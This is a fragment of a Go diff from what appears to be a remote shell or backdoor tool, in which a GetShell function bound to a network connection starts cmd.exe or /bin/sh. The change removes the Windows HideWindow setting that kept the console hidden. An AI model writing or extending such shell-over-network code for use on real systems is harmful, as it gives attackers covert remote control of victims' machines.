@@ -17,7 +17,6 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
-	"syscall"
 	"time"
 )
 
@@ -44,7 +43,6 @@ func GetShell(conn net.Conn) {
 	switch runtime.GOOS {
 	case "windows":
 		cmd = exec.Command("cmd.exe")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	default:
 		cmd = exec.Command("/bin/sh")
 	}
